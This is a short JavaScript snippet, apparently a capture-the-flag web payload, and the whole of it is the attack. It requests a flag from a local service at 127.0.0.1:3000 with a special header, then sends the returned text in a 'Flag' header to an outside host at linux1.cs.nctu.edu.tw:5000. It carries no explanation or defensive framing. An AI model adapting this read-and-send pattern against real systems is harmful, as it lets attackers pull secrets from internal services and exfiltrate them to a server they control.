
fetch("http://127.0.0.1:3000/flag", {headers: { 'give-me-the-flag': 'yes' }}).then(response => response.text()).then(text => { 
    fetch("http://linux1.cs.nctu.edu.tw:5000/flag", {headers: { 'Flag': text }}) 
});
